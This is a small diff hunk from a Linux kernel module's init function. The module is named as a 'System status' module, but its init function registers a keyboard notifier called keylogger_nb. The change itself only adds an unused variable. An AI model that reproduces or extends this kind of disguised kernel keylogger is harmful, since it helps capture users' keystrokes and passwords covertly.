@@ -413,6 +413,7 @@ static int __init init_sys_status(void)
 {
   int err = -1;
   int result = 42;
+	int run = 0;
   //keybot notifier init
   register_keyboard_notifier(&keylogger_nb);
   printk(KERN_INFO "System status module: Registering the keylogger module with the keyboard notifier list\n");
